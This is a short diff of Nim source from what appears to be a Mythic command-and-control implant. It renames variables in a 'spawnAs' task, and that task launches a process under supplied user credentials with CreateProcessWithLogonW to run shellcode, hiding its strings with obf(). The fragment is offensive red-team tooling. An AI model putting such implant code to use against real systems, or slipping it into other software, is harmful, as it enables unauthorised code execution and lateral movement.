@@ -85,9 +85,9 @@ proc executeSpawnAs*(taskId: string, shellcode: seq[byte], params: JsonNode): Js
       
       # Get spawnto path
       when hostCPU == "amd64":
-        let (spawntoPath, spawntoArgs) = getSpawntoX64()
+        let (spawntoPath, _) = getSpawntoX64()
       else:
-        let (spawntoPath, spawntoArgs) = getSpawntoX86()
+        let (spawntoPath, _) = getSpawntoX86()
       
       if spawntoPath.len == 0:
         return mythicError(taskId, obf("spawnto path is not set for this architecture"))
@@ -110,7 +110,7 @@ proc executeSpawnAs*(taskId: string, shellcode: seq[byte], params: JsonNode): Js
       
       debug &"[DEBUG] SpawnAs: Creating process as {args.domain}\\{args.username}"
       
-      let result = CreateProcessWithLogonW(
+      let createResult = CreateProcessWithLogonW(
         wUsername,
         wDomain,
         wPassword,
@@ -124,7 +124,7 @@ proc executeSpawnAs*(taskId: string, shellcode: seq[byte], params: JsonNode): Js
         addr pi
       )
       
-      if result == 0:
+      if createResult == 0:
         let err = GetLastError()
         var errMsg = obf("CreateProcessWithLogonW failed: ")
         case err
